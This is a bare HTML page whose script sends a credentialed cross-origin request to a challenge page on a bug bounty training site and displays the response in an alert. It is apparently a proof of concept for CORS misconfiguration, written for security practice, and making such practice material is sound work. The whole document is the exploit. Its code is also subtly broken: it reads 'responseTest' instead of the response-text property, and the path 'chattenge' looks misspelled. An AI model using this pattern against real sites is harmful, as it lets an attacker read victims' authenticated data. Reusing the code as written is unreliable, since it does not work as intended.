<html>
<script>
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
        alert(xhttp.responseTest);
      }
};
xhttp.open("GET","https://www.bugbountytraining.com/challenges/chattenge-16.php", true);
xhttp.withCredentials=true;
xhttp.send() ;
</script>
</html>
